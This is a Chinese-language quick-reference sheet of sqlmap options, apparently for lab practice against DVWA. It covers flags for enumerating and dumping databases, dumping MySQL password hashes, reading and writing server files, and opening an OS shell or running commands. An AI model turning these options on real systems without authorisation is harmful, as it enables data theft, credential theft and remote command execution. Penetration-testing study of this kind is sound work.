sqlmap 核心参数速查表

# ===== 基础侦察 =====

-u "URL"                      # 指定目标 URL

--data="k=v&k=v"              # POST body

--cookie="k=v; k=v"           # 带 Cookie

--level=2                     # 测 Cookie/User-Agent（默认 1 不测）

--risk=3                      # 提升风险等级（1-3，3 会用重 payload）

--flush-session               # 清缓存重新探测

--batch                       # 自动回答所有提示

-v 3                          # 详细程度（1-6，6 最详细）

# ===== 注入点指定 =====

*                             # 加在参数值后，强制指定注入点

-p id                         # 只测指定参数

--skip="Submit"               # 跳过指定参数

# ===== 数据枚举 =====

--dbs                         # 列所有库

-D dvwa --tables              # 列指定库的表

-D dvwa -T users --columns    # 列指定表的列

-D dvwa -T users --dump       # dump 指定表

--dump-all                    # dump 所有

--search -T user              # 搜表名

--search -C pass              # 搜列名

# ===== 权限侦察 =====

--current-user                # 当前用户

--current-db                  # 当前库

--is-dba                       # 是否 DBA

--privileges                  # 列权限

--passwords                   # dump MySQL 账户 hash

--hostname                    # 主机名

# ===== 文件操作 =====

--file-read="C:/path/file"   # 读文件

--file-write="/tmp/file"     # 写文件源

--file-dest="C:/path/file"   # 写文件目标路径

# ===== 系统命令 =====

--os-shell                    # 交互式 OS shell

--os-cmd="whoami"             # 执行单条命令

--sql-shell                   # 交互式 SQL shell

# ===== 进阶控制 =====

--technique=BEU               # 指定注入技术

--tamper=space2comment        # 启用 tamper

--eval="import hashlib; ..."        # 动态计算请求参数

--time-sec=10                 # time-based 等待秒数

--dbms=mysql                   # 指定后端类型
